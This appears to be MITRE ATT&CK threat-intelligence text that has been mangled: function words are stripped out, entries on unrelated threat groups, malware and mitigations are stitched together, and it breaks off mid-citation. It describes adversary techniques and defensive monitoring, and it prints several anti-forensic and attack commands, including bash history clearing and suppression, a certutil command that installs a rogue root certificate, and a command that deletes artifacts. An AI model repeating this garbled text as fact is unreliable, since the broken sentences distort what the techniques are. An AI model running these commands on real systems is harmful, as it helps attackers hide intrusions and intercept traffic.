[APT28](https://attack.mitre.org/groups/G0007) loader Trojan enumerate victim's processes searching explorer.exe current process permissions.(Citation: Unit 42 Playbook Dec 2017) Network intrusion detection prevention systems network signatures identify traffic specific adversary command control infrastructure malware mitigate activity network level.  Monitor newly constructed files abuse print processors malicious DLLs boot persistence privilege escalation. [MegaCortex](https://attack.mitre.org/software/S0576) kill endpoint security processes.(Citation: IBM MegaCortex) [OilRig](https://attack.mitre.org/groups/G0049) deleted files payload execution.(Citation: FireEye APT34 Dec 2017)(Citation: Unit 42 OopsIE! Feb 2018) [FIN6](https://attack.mitre.org/groups/G0037) <code>kill.bat</code> script disable security tools.(Citation: FireEye FIN6 Apr 2019) [Hancitor](https://attack.mitre.org/software/S0499) <code>CallWindowProc</code> <code>EnumResourceTypesA</code> interpret execute shellcode.(Citation: FireEye Hancitor) [APT28](https://attack.mitre.org/groups/G0007) compromised targets strategic compromise utilizing custom exploit kits.(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Emotet](https://attack.mitre.org/software/S0367) exfiltrating stored cookies request C2 servers. (Citation: Trend Micro Emotet Jan 2019) [TeamTNT](https://attack.mitre.org/groups/G0139) cleared command history <code>history -c</code>.(Citation: Trend Micro TeamTNT)(Citation: Cisco Talos Intelligence Group) [Shamoon](https://attack.mitre.org/software/S0140) obtains target's IP address local network segment.(Citation: Palo Alto Shamoon Nov 2016)(Citation: McAfee Shamoon December 2018) Administrators perform audit access lists permissions granted access applications services. extensively resources establish baseline, periodic audits updated resources. Suspicious accounts/credentials investigated removed. [Lazarus Group](https://attack.mitre.org/groups/G0032) exfiltrated data files C2 channel tools malware.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster Loaders)(Citation: McAfee Lazarus Resurfaces Feb 2018)(Citation: McAfee Lazarus Nov 2020) [BadPatch](https://attack.mitre.org/software/S0337) collects OS system, OS version, MAC address, victim’s machine.(Citation: Unit 42 BadPatch Oct 2017) [DownPaper](https://attack.mitre.org/software/S0186) searches reads Windows Update Registry key.(Citation: ClearSky Charming Kitten Dec 2017) [BADNEWS](https://attack.mitre.org/software/S0128) creates scheduled task establish executing malicious payload subsequent minute.(Citation: PaloAlto Patchwork Mar 2018) [APT41](https://attack.mitre.org/groups/G0096) encrypted payloads Data Protection API (DPAPI), relies tied specific user accounts specific machines. [APT41](https://attack.mitre.org/groups/G0096) environmentally keyed stage malware RC5 key derived infected system's volume serial number.(Citation: Twitter ItsReallyNick APT41 EK) Periodically baseline instances identify malicious modifications additions. Credential resources exploitation detectable seen. [Rocke](https://attack.mitre.org/groups/G0106) Python-based malware install spread coinminer.(Citation: Anomali Rocke March 2019) [Doki](https://attack.mitre.org/software/S0600) embedTLS library network communications.(Citation: Intezer Doki July 20) Monitor newly executed processes [Valid Accounts](https://attack.mitre.org/techniques/T1078) interact remote systems Windows Remote Management (WinRM), service processes <code>wmiprvse.exe</code> destination hosts. [DOGCALL](https://attack.mitre.org/software/S0213) capable logging keystrokes.(Citation: FireEye APT37 Feb 2018)(Citation: Unit 42 Nokki Oct 2018) Monitor analyze network traffic data replication (such calls DrsAddEntry, DrsReplicaAdd, GetNCChanges) DCs to/from DC hosts. (Citation: GitHub DCSYNCMonitor)(Citation: DCShadow Blog) DC replication naturally 15 minutes triggered adversary legitimate urgent (ex: passwords). Monitor firewall rules unexpected modifications allow/block specific network traffic maliciously modify components victim environment hinder disable defensive mechanisms. [TrickBot](https://attack.mitre.org/software/S0266) establishes persistence creating autostart service machine boots.(Citation: Trend Micro Trickbot Nov 2018) [LAPSUS$](https://attack.mitre.org/groups/G1004) Explorer tool enumerate users victim's network.(Citation: MSTIC DEV-0537 Mar 2022) [PowerPunch](https://attack.mitre.org/software/S0685) ability execute PowerShell.(Citation: Actinium February 2022) [Bonadan](https://attack.mitre.org/software/S0486) external IP address infected host.(Citation: ESET ForSSHe December 2018) Limit privileges user accounts authorized administrators interact service service binary target path locations. Deny execution user directories file download directories temp directories able.

Ensure proper permissions directory access control set deny users ability write files top-level directory <code>C:</code> directories, <code>C:\Windows\</code>, reduce malicious files execution. [InvisiMole](https://attack.mitre.org/software/S0260) lists local users session information.(Citation: ESET InvisiMole June 2018) [Metamorfo](https://attack.mitre.org/software/S0455) command delete Registry key uses, <code>\Software\Microsoft\Internet Explorer\notes</code>.(Citation: FireEye Metamorfo Apr 2018) [BadPatch](https://attack.mitre.org/software/S0337) captures screenshots .jpg format exfiltrates them.(Citation: Unit 42 BadPatch Oct 2017) [Saint Bot](https://attack.mitre.org/software/S1018) `cmd.exe` `.bat` scripts execution.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [DRATzarus](https://attack.mitre.org/software/S0694) `GetTickCount` `GetSystemTimeAsFileTime` API calls inspect time.(Citation: ClearSky Lazarus Aug 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) compromised targets strategic compromise (SWC) utilizing custom exploit kit.(Citation: Secureworks IRON LIBERTY July 2019)(Citation: US-CERT TA18-074A)(Citation: Gigamon Berserk Bear October 2021) [Sandworm Team](https://attack.mitre.org/groups/G0034) delivered malicious Office attachments spearphishing emails.(Citation: iSight Sandworm Oct 2014)(Citation: US-CERT Ukraine Feb 2016)(Citation: ESET Telebots Dec 2016)(Citation: District Court Indictment GRU Unit 74455 October 2020) [SUNBURST](https://attack.mitre.org/software/S0559) collected compromised host.(Citation: Analyzing Solorigate Dec 2020)(Citation: FireEye SUNBURST Backdoor December 2020) [build_downer](https://attack.mitre.org/software/S0471) ability add Registry key persistence.(Citation: Trend Micro Tick November 2019) [ShimRatReporter](https://attack.mitre.org/software/S0445) listed non-privileged privileged accounts machine.(Citation: FOX-IT 2016 Mofang) [POWRUNER](https://attack.mitre.org/software/S0184) collect victim's anti-virus software.(Citation: FireEye APT34 Dec 2017) Windows 10, update Windows Defender Application Control policies include rules block older, vulnerable versions PubPrn.(Citation: Microsoft_rec_block_rules) Monitor executed commands arguments root access (allowing read securityd’s memory), scan memory correct sequence decrypt user’s logon keychain. [KeyBoy](https://attack.mitre.org/software/S0387) <code>-w Hidden</code> conceal [PowerShell](https://attack.mitre.org/techniques/T1059/001) window downloads payload. (Citation: PWC KeyBoys Feb 2017) [Heyoka Backdoor](https://attack.mitre.org/software/S1027) decrypt payload prior execution.(Citation: SentinelOne Aoqin Dragon June 2022) [gh0st RAT](https://attack.mitre.org/software/S0032) inject malicious code process created “Command_Create&Inject” function.(Citation: Gh0stRAT ATT March 2019) [BADCALL](https://attack.mitre.org/software/S0245) FakeTLS method C2.(Citation: US-CERT BADCALL) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) VBS VBE scripts execution.(Citation: Secureworks BRONZE BUTLER Oct 2017)(Citation: Trend Micro Tick November 2019) [Spark](https://attack.mitre.org/software/S0543) cmd.exe commands.(Citation: Unit42 Molerat Mar 2020)  [NETWIRE](https://attack.mitre.org/software/S0198) inject code processes including notepad.exe, svchost.exe, vbc.exe.(Citation: Red Canary NETWIRE January 2020) strong passphrases private cracking difficult. store credentials Registry. Establish organizational policy prohibits password storage files. [Mustang Panda](https://attack.mitre.org/groups/G0129) delivered bugs malicious links intended targets.(Citation: McAfee Dianxun March 2021)(Citation: Proofpoint TA416 Europe March 2022) [Earth Lusca](https://attack.mitre.org/groups/G1006) [certutil](https://attack.mitre.org/software/S0160) decode string cabinet file.(Citation: TrendMicro EarthLusca 2022) [PoetRAT](https://attack.mitre.org/software/S0428) Python tool named Bewmac record webcam compromised hosts.(Citation: Talos PoetRAT April 2020) [TeamTNT](https://attack.mitre.org/groups/G0139) aggregated collected credentials files exfiltrating.(Citation: Cisco Talos Intelligence Group) [Turla](https://attack.mitre.org/groups/G0010) surveys check-in discover running services processes <code>tasklist /svc</code> command.(Citation: Kaspersky Turla) [Xbash](https://attack.mitre.org/software/S0341) create cronjob persistence determines Linux system.(Citation: Unit42 Xbash Sept 2018) [TeamTNT](https://attack.mitre.org/groups/G0139) scanned vulnerabilities IoT devices resources Docker API.(Citation: Trend Micro TeamTNT) [Regin](https://attack.mitre.org/software/S0019) leveraged compromised universities proxies obscure origin.(Citation: Kaspersky Regin) [Rifdoor](https://attack.mitre.org/software/S0433) created registry entry <code>HKEY_CURRENT_USERS\Software\Microsoft\Windows\CurrentVersion\Run\Graphics</code> <code>C:\ProgramData\Initech\Initech.exe /run</code>.(Citation: Carbon Black HotCroissant April 2020) (Citation: FireEye APT34 Dec 2017) Ensure containers running root default. Kubernetes environments, defining Pod Security Policy prevents pods running privileged containers.(Citation: Kubernetes Hardening Guide) Monitor newly constructed network connections received untrusted hosts.  [FIN8](https://attack.mitre.org/groups/G0061) distributed targeted emails links malicious documents embedded macros.(Citation: FireEye Enemy FIN8 Aug 2016) [FoggyWeb](https://attack.mitre.org/software/S0661) retrieve configuration data compromised FS server.(Citation: MSTIC FoggyWeb September 2021) Monitor creation binaries service executables occur regular software update update scheduled organization. behavior considers files overwritten. [Fox Kitten](https://attack.mitre.org/groups/G0117) Google Chrome bookmarks identify internal resources assets.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [Aquatic Panda](https://attack.mitre.org/groups/G0143) downloaded additional malware compromised hosts.(Citation: CrowdStrike AQUATIC PANDA December 2021) [Thrip](https://attack.mitre.org/groups/G0076) cloud-based remote access software called LogMeIn attacks.(Citation: Symantec Thrip June 2018) [Chrommme](https://attack.mitre.org/software/S0667) ability list drives compromised host.(Citation: ESET Gelsemium June 2021) Monitor network traffic originating unknown/unexpected hardware devices. Local network traffic metadata (such source MAC addressing) usage network management protocols DHCP helpful identifying hardware. [Amadey](https://attack.mitre.org/software/S1025) victim data C2 servers.(Citation: BlackBerry Amadey 2020) [Nebulae](https://attack.mitre.org/software/S0630) achieve persistence Registry key.(Citation: Bitdefender Naikon April 2021) flood volumes exceed capacity network connection targeted, typically intercept incoming traffic upstream filter attack traffic legitimate traffic. defenses hosting Internet Service Provider (ISP) 3rd party Content Delivery Network (CDN) providers specializing DoS mitigations.(Citation: CERT-EU DDoS March 2017)

Depending flood volume, on-premises filtering blocking source addresses sourcing attack, blocking ports targeted, blocking protocols transport.(Citation: CERT-EU DDoS March 2017)

As response require rapid engagement 3rd parties, analyze risk critical resources Network DoS attacks create disaster recovery plan/business continuity plan respond incidents.(Citation: CERT-EU DDoS March 2017) [CORESHELL](https://attack.mitre.org/software/S0137) collects hostname, volume serial OS version data victim sends C2 server.(Citation: FireEye APT28) Monitor executed commands arguments establish persistence executing malicious commands triggered user’s shell. (Citation: Novetta-Axiom) Changing UAC settings "Always Notify" user visibility UAC elevation requested, however, option popular users constant UAC interruptions. Inventory Control Panel items locate unregistered malicious files systems:
* Executable format registered Control Panel items globally unique identifier (GUID) registration Registry entries <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ControlPanel\NameSpace</code> <code>HKEY_CLASSES_ROOT\CLSID\{GUID}</code>. entries Control Panel item display name, path local file, command executed Control Panel. (Citation: Implementing CPL)
* CPL format registered Control Panel items stored System32 directory automatically Control Panel. Control Panel items registration entries <code>CPLs</code> <code>Extended Properties</code> Registry <code>HKEY_LOCAL_MACHINE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Control Panel</code>. entries include GUID, path local file, canonical launch file programmatically (<code> WinExec("c:\windows\system32\control.exe {Canonical_Name}", SW_NORMAL);</code>) command (<code>control.exe /name {Canonical_Name}</code>).(Citation: Implementing CPL)
* Control Panel items extensible extensions registered <code>HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Controls Folder\{name}\Shellex\PropertySheetHandlers</code> {name} predefined item.(Citation: Implementing CPL) [Bazar](https://attack.mitre.org/software/S0534) manually loaded ntdll disk identity remove API hooks set security products.(Citation: NCC Team9 June 2020)	 [Machete](https://attack.mitre.org/groups/G0095) multiple compiled Python scripts victim’s system. [Machete](https://attack.mitre.org/groups/G0095)'s main backdoor [Machete](https://attack.mitre.org/software/S0409) written Python.(Citation: Cylance Machete Mar 2017)(Citation: ESET Machete July 2019)(Citation: 360 Machete Sep 2020) Monitor script processes, `cscript proxy execution malicious files. [Lokibot](https://attack.mitre.org/software/S0447) search specific files infected host.(Citation: Talos Lokibot Jan 2021) [TA505](https://attack.mitre.org/groups/G0092) fast flux mask botnets distributing payloads multiple IPs.(Citation: Trend Micro TA505 June 2019) [SILENTTRINITY](https://attack.mitre.org/software/S0692) WMI lateral movement.(Citation: GitHub SILENTTRINITY Modules July 2019) [LoudMiner](https://attack.mitre.org/software/S0451) set attributes VirtualBox directory VBoxVmService parent directory "hidden".(Citation: ESET LoudMiner June 2019) [POWRUNER](https://attack.mitre.org/software/S0184) collect domain running <code>net /domain</code> series commands victim.(Citation: FireEye APT34 Dec 2017) [build_downer](https://attack.mitre.org/software/S0471) extract malware downloaded JPEG.(Citation: Trend Micro Tick November 2019) [Hildegard](https://attack.mitre.org/software/S0601) packed ELF files binaries.(Citation: Unit 42 Hildegard Malware) behaviors endpoint successful compromise, abnormal behaviors browser processes. include suspicious files written disk, evidence [Process Injection](https://attack.mitre.org/techniques/T1055) attempts hide execution, evidence Discovery. [CrackMapExec](https://attack.mitre.org/software/S0488) brute force passwords user single target entire network.(Citation: CME Github September 2018) [NOKKI](https://attack.mitre.org/software/S0353) established persistence writing payload Registry key <code>HKCU\Software\Microsoft\Windows\CurrentVersion\Run</code>.(Citation: Unit 42 NOKKI Sept 2018) Monitor newly constructed files port monitors attacker supplied DLL boot persistence privilege escalation. [Aria-body](https://attack.mitre.org/software/S0456) ability capture screenshots compromised hosts.(Citation: CheckPoint Naikon 2020) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) injects explorer.exe.(Citation: Symantec Dragonfly)(Citation: Gigamon Berserk Bear October 2021) [Silent Librarian](https://attack.mitre.org/groups/G0122) collected lists names individuals targeted organizations.(Citation: DOJ Iran Indictments March 2018) [Reg](https://attack.mitre.org/software/S0075) gather details Windows Registry local remote command-line interface.(Citation: Reg) [HOPLIGHT](https://attack.mitre.org/software/S0376) observed enumerating drives partitions.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Moses Staff](https://attack.mitre.org/groups/G1009) collected infected host, including machine names OS architecture.(Citation: Checkpoint MosesStaff Nov 2021)
 [ROKRAT](https://attack.mitre.org/software/S0240) list current running processes system.(Citation: Talos ROKRAT)(Citation: NCCGroup RokRat Nov 2018) [RunningRAT](https://attack.mitre.org/software/S0253) captures keystrokes sends C2 server.(Citation: McAfee Gold Dragon) (Citation: Sofacy DealersChoice)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Elderwood](https://attack.mitre.org/groups/G0066) delivered zero-day exploits malware victims targeted emails malicious attachments.(Citation: Symantec Elderwood Sept 2012)(Citation: CSM Elderwood Sept 2012) Monitor executed commands arguments BITSAdmin tool (especially ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', 'Resume' command options)(Citation: BITS) Admin logs, PowerShell logs, Windows Event log BITS activity.(Citation: Elastic - Hunting Persistence 1) investigating detailed jobs parsing BITS job database.(Citation: CTU BITS Malware June 2016) [BOOSTWRITE](https://attack.mitre.org/software/S0415) encoded payloads ChaCha stream cipher 256-bit key 64-bit Initialization vector (IV) evade detection.(Citation: FireEye FIN7 Oct 2019) [Cobalt Strike](https://attack.mitre.org/software/S0154) spawn processes alternate PPIDs.(Citation: CobaltStrike Daddy 2017)(Citation: Cobalt Strike Manual 4.3 November 2020) [C0015](https://attack.mitre.org/campaigns/C0015), security researchers assessed threat actors phishing campaign distribute weaponized attachment victims.(Citation: DFIR Conti Bazar Nov 2021) [Avaddon](https://attack.mitre.org/software/S0640) Windows Crypto API generate AES key.(Citation: Hornet Security Avaddon June 2020) [Carbanak](https://attack.mitre.org/groups/G0008) installs VNC server software executes rundll32.(Citation: Kaspersky Carbanak) [Lazarus Group](https://attack.mitre.org/groups/G0032) GitHub C2, pulling hosted image payloads committing command execution output files specific directories.(Citation: Lazarus APT January 2022) [APT29](https://attack.mitre.org/groups/G0016) registered algorithmically generated Twitter handles C2 malware, [HAMMERTOSS](https://attack.mitre.org/software/S0037).(Citation: FireEye APT29)(Citation: MSTIC NOBELIUM 2021) [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers retrieve lists running processes.(Citation: Symantec Pasam 2012) Application Firewalls limit exposure applications prevent exploit traffic reaching application. [RawPOS](https://attack.mitre.org/software/S0169) encodes credit card data collected victim XOR.(Citation: TrendMicro RawPOS April 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016)(Citation: Visa RawPOS March 2015) principal privilege protect administrative access domain trusts. [Chrommme](https://attack.mitre.org/software/S0667) decrypt encrypted internal code.(Citation: ESET Gelsemium June 2021) Monitor network traffic WMI connections; WMI environments typically WMI suspect. domain administrator accounts day-to-day operations expose potential adversaries unprivileged systems. [ROKRAT](https://attack.mitre.org/software/S0240) request delete files.(Citation: NCCGroup RokRat Nov 2018)	 [APT38](https://attack.mitre.org/groups/G0082) custom MBR wiper named BOOTWRECK, initiate reboot wiping victim's MBR.(Citation: FireEye APT38 Oct 2018) [ADVSTORESHELL](https://attack.mitre.org/software/S0045) delete files directories.(Citation: ESET Sednit 2) [Fysbis](https://attack.mitre.org/software/S0410) encrypted XOR RC4.(Citation: Fysbis Dr Analysis)  [Cuba](https://attack.mitre.org/software/S0625) command <code>cmd.exe /c del</code> delete artifacts system.(Citation: McAfee Cuba April 2021)  [BlackEnergy](https://attack.mitre.org/software/S0089) plug-in victim spread local network [PsExec](https://attack.mitre.org/software/S0029) accessing admin shares.(Citation: Securelist BlackEnergy Nov 2014) [ThreatNeedle](https://attack.mitre.org/software/S0665) collect profile compromised host.(Citation: Kaspersky ThreatNeedle Feb 2021) (Citation: ANSSI Sandworm January 2021) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) AES encrypted communications C2.(Citation: Zscaler APT31 Covid-19 October 2020) Monitor DLLs loaded process detect DLLs file abnormal paths. [QuasarRAT](https://attack.mitre.org/software/S0262) command edit Registry victim’s machine.(Citation: GitHub QuasarRAT)(Citation: CISA AR18-352A Quasar RAT December 2018) [HARDRAIN](https://attack.mitre.org/software/S0246) binds listens port 443 FakeTLS method.(Citation: US-CERT HARDRAIN March 2018) [Wizard Spider](https://attack.mitre.org/groups/G0102) lured victims execute malware spearphishing attachments macros download [Emotet](https://attack.mitre.org/software/S0367), Bokbot, [TrickBot](https://attack.mitre.org/software/S0266), [Bazar](https://attack.mitre.org/software/S0534).(Citation: CrowdStrike Grim Spider 2019)(Citation: CrowdStrike Wizard Spider October 2020) Data loss prevention restrict access sensitive data detect sensitive data unencrypted. [TA505](https://attack.mitre.org/groups/G0092) password-protected malicious Word documents base64 encoded PowerShell commands.(Citation: Proofpoint TA505 Sep 2017)(Citation: Cybereason TA505 April 2019)(Citation: Deep Instinct TA505 Apr 2019) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events activation instances occurring normal activity/planned operations. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Crimson](https://attack.mitre.org/software/S0115) determine installed host 15 days downloading final payload.(Citation: Proofpoint Operation Transparent Tribe March 2016) [Ke3chang](https://attack.mitre.org/groups/G0004) performed frequent scheduled data collection victim networks.(Citation: NICKEL December 2021) multiple methods preventing user's command history flushed .bash_history file, including commands:
<code>set +o history</code> <code>set -o history</code> start logging again;
<code>unset HISTFILE</code> user's .bash_rc file; and
<code>ln -s /dev/null ~/.bash_history</code> write commands <code>/dev/null</code>instead. [Cyclops Blink](https://attack.mitre.org/software/S0687) upload files compromised host.(Citation: NCSC Cyclops Blink February 2022) (Citation: Symantec Elderwood Sept 2012) [Proton](https://attack.mitre.org/software/S0279) modifies tty_tickets sudoers file.(Citation: objsee mac malware 2017) Monitor firmware unexpected modifications settings data rootkits hide presence programs, files, network connections, services, drivers, components. rootkit protections built anti-virus operating software. dedicated rootkit detection tools specific types rootkit behavior.  Applications vulnerabilities escapes setuid setgid bits set reduce potential damage application compromised. Additionally, programs setuid setgid bits set minimized system. Ensuring sudo tty_tickets setting enabled prevent leakage tty sessions. [GoldenSpy](https://attack.mitre.org/software/S0493) exfiltrated host environment external C2 domain port 9006.(Citation: Trustwave GoldenSpy June 2020)	 [Koadic](https://attack.mitre.org/software/S0250) C2 communications.(Citation: MalwareBytes LazyScripter Feb 2021)  encryption, [Diavol](https://attack.mitre.org/software/S0659) capture desktop background window, set background color black, change desktop wallpaper newly created bitmap image “All files encrypted! “README-FOR-DECRYPT.txt".(Citation: Fortinet Diavol July 2021) [Bankshot](https://attack.mitre.org/software/S0239) decodes embedded XOR strings.(Citation: US-CERT Bankshot Dec 2017) [Hydraq](https://attack.mitre.org/software/S0203) creates Registry subkey register created service, uninstall deleting value. [Hydraq](https://attack.mitre.org/software/S0203)'s backdoor enables remote attackers modify delete subkeys.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) Determine websites spearphishing business operations blocking access activity monitored poses risk. backdoor [APT29](https://attack.mitre.org/groups/G0016) created [Tor](https://attack.mitre.org/software/S0183) hidden service traffic [Tor](https://attack.mitre.org/software/S0183) client local ports 3389 (RDP), 139 (Netbios), 445 (SMB) enabling remote access network TOR.(Citation: Mandiant Easy Breach)(Citation: MSTIC Nobelium Oct 2021) [OopsIE](https://attack.mitre.org/software/S0264) WMI perform discovery techniques.(Citation: Unit 42 OilRig Sept 2018) monitoring size virtual machines running system. Adversaries create virtual images typical virtual machines.(Citation: Shadowbunny VM Defense Evasion) Network adapter helpful detecting virtual instances. [certutil](https://attack.mitre.org/software/S0160) install browser root certificates precursor performing [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) connections banking websites. command: <code>certutil -addstore -f -user ROOT ProgramData\cert512121.der</code>.(Citation: Palo Alto Retefe) application control mitigate installation unapproved software remote access. [DustySky](https://attack.mitre.org/software/S0062) exfiltrated data C2 server.(Citation: Kaspersky MoleRATs April 2019) [StoneDrill](https://attack.mitre.org/software/S0380) current time victim machine.(Citation: Kaspersky StoneDrill 2017)	 [Dark Caracal](https://attack.mitre.org/groups/G0070) leveraged compiled file contained command download executable.(Citation: Lookout Dark Caracal Jan 2018) [PowerLess](https://attack.mitre.org/software/S1012) ability exfiltrate data, including Chrome Edge browser database files, compromised machines.(Citation: Cybereason PowerLess February 2022)
 Monitor newly constructed network connections cloud services abnormal non-browser processes. [Cobian RAT](https://attack.mitre.org/software/S0338) launch remote command interface executing commands.(Citation: Zscaler Cobian Aug 2017) [Frankenstein](https://attack.mitre.org/campaigns/C0001), threat actors WMI queries determine analysis tools running compromised system.(Citation: Talos Frankenstein June 2019) [Dtrack](https://attack.mitre.org/software/S0567) hide replicas legitimate programs OllyDbg, 7-Zip, FileZilla.(Citation: CyberBit Dtrack) [Stuxnet](https://attack.mitre.org/software/S0603) encrypted configuration blocks writes encrypted files disk.(Citation: Symantec W.32 Stuxnet Dossier) [OSX/Shlayer](https://attack.mitre.org/software/S0402) <code>chmod</code> utility set file executable, <code>chmod 777</code> <code>chmod +x</code>.(Citation: 20 macOS Common Tools Techniques)(Citation: Carbon Black Shlayer Feb 2019)(Citation: Shlayer jamf gatekeeper bypass 2021) [Ferocious Kitten](https://attack.mitre.org/groups/G0137) right-to-left override reverse executables’ names file extensions, real ones.(Citation: Kaspersky Ferocious Kitten Jun 2021) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tools encode data base64 posting C2 server.(Citation: Secureworks BRONZE BUTLER Oct 2017) [AADInternals](https://attack.mitre.org/software/S0677) send phishing emails malicious links designed collect users’ credentials.(Citation: AADInternals Documentation) [Grandoreiro](https://attack.mitre.org/software/S0531) create link files startup folder persistence.(Citation: IBM Grandoreiro April 2020)(Citation: ESET Grandoreiro April 2020) (Citation: SentinelOne FrameworkPOS September 2019)(Citation: Crowdstrike Global Threat Report Feb 2018)(Citation: Visa FIN6 Feb 2019) [Kimsuky](https://attack.mitre.org/groups/G0094) purchased hosting servers virtual currency prepaid cards.(Citation: KISA Operation Muzabi) [Zebrocy](https://attack.mitre.org/software/S0251) exfiltrated data designated C2 server POST requests.(Citation: Accenture SNAKEMACKEREL Nov 2018)(Citation: CISA Zebrocy Oct 2020)  Monitor third-party application logging, messaging, artifacts send spearphishing emails malicious attachment attempt gain access victim systems. Filtering based DKIM+SPF header analysis detect email sender spoofed.(Citation: Anti Spoofing)(Citation: ACSC Email Spoofing) Anti-virus detect malicious documents attachments scanned stored email server user's computer. Monitor suspicious descendant process spawning Office productivity software.(Citation: Elastic - Koadiac Detection EQL) [Lucifer](https://attack.mitre.org/software/S0532) check specific usernames, names, device drivers, DLL's, virtual devices sandboxed environments enter infinite loop detected.(Citation: Unit 42 Lucifer June 2020) [Higaisa](https://attack.mitre.org/groups/G0126) Base64 encoded compressed payloads.(Citation: Malwarebytes Higaisa 2020)(Citation: Zscaler Higaisa 2020) Monitor executed commands arguments detect token manipulation auditing command-line activity. Specifically, analysts runas command artifacts. Detailed command-line logging enabled default Windows.(Citation: Command-line Logging) [sqlmap](https://attack.mitre.org/software/S0225) automate exploitation SQL injection vulnerabilities.(Citation: sqlmap Introduction) Monitor newly executed processes hidden windows conceal malicious activity plain sight users. [Carbanak](https://attack.mitre.org/software/S0030) command create reverse shell.(Citation: FireEye CARBANAK June 2017) [Penquin](https://attack.mitre.org/software/S0587) connect C2 sniffing "magic packet" TCP UDP packets matching specific conditions.(Citation: Leonardo Turla Penquin 2020)(Citation: Kaspersky Turla Penquin December 2014) [Pisloader](https://attack.mitre.org/software/S0124) command collect victim's IP address.(Citation: Palo Alto DNS Requests) [Aria-body](https://attack.mitre.org/software/S0456) ability identify username compromised host.(Citation: CheckPoint Naikon 2020) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [InnaputRAT](https://attack.mitre.org/software/S0259) 8-byte XOR key obfuscate API names strings contained payload.(Citation: ASERT InnaputRAT April 2018) [BabyShark](https://attack.mitre.org/software/S0414) executed <code>tasklist</code> command.(Citation: Unit42 BabyShark Feb 2019)	 modifying host firewall rules prevent egress traffic verclsid.exe. [Magic Hound](https://attack.mitre.org/groups/G0059) open-source JNDI exploit kits exploit Log4j (CVE-2021-44228) exploited ProxyShell (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) Exchange servers.(Citation: Check APT35 CharmPower January 2022)(Citation: DFIR Report APT35 ProxyShell March 2022)(Citation: Cybereason PowerLess February 2022) [Fox Kitten](https://attack.mitre.org/groups/G0117) cmd.exe password changing mechanism.(Citation: CISA AA20-259A Iran-Based Actor September 2020) [CrackMapExec](https://attack.mitre.org/software/S0488) set scheduled task target execute commands remotely [at](https://attack.mitre.org/software/S0110).(Citation: CME Github September 2018) [APT28](https://attack.mitre.org/groups/G0007) performed large-scale scans attempt vulnerable servers.(Citation: TrendMicro Pawn Storm 2019) [PlugX](https://attack.mitre.org/software/S0013) ability DLL search hijacking installation targeted systems.(Citation: Proofpoint TA416 Europe March 2022) [VERMIN](https://attack.mitre.org/software/S0257) decrypts code, strings, commands victim's machine.(Citation: Unit 42 VERMIN Jan 2018) signed scripts execute programs environment. application control configured block execution scripts required network prevent potential misuse adversaries. [APT28](https://attack.mitre.org/groups/G0007) hijacking persistence replacing legitimate <code>MMDeviceEnumerator</code> object payload.(Citation: ESET Sednit 1)(Citation: ESET Zebrocy 2019) [APT39](https://attack.mitre.org/groups/G0087) created scheduled tasks persistence.(Citation: FireEye APT39 Jan 2019)(Citation: BitDefender Chafer 2020)(Citation: FBI FLASH APT39 September 2020) [LightNeuron](https://attack.mitre.org/software/S0395) AES XOR decrypt configuration files commands.(Citation: ESET LightNeuron 2019) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) tools enumerate software installed infected host.(Citation: Trend Micro Tick November 2019) [Spark](https://attack.mitre.org/software/S0543) encoded communications C2 server base64.(Citation: Unit42 Molerat Mar 2020)  [DropBook](https://attack.mitre.org/software/S0547) communicate operators exploiting Simplenote, DropBox, social media platform, Facebook, create fake accounts control backdoor receive instructions.(Citation: Cybereason Molerats Dec 2020)(Citation: BleepingComputer Molerats Dec 2020) [Grandoreiro](https://attack.mitre.org/software/S0531) infected victims malicious attachments.(Citation: IBM Grandoreiro April 2020) [Remcos](https://attack.mitre.org/software/S0332) command hide injecting process.(Citation: Fortinet Remcos Feb 2017) [Kessel](https://attack.mitre.org/software/S0487) decrypted binary's configuration <code>main</code> function launched.(Citation: ESET ForSSHe December 2018) [BBSRAT](https://attack.mitre.org/software/S0127) query service configuration information.(Citation: Palo Alto Networks BBSRAT) [GravityRAT](https://attack.mitre.org/software/S0237) lists running processes system.(Citation: Talos GravityRAT) [Okrum](https://attack.mitre.org/software/S0439)'s payload encrypted embedded loader, legitimate PNG file.(Citation: ESET Okrum July 2019) Configure browsers tasks regularly delete persistent cookies. [AdFind](https://attack.mitre.org/software/S0552) extract subnet Active Directory.(Citation: Red Canary Hospital Thwarted Ryuk October 2020)(Citation: FireEye FIN6 Apr 2019)(Citation: FireEye Ryuk Trickbot January 2019) [APT41](https://attack.mitre.org/groups/G0096) uploaded files data compromised host.(Citation: 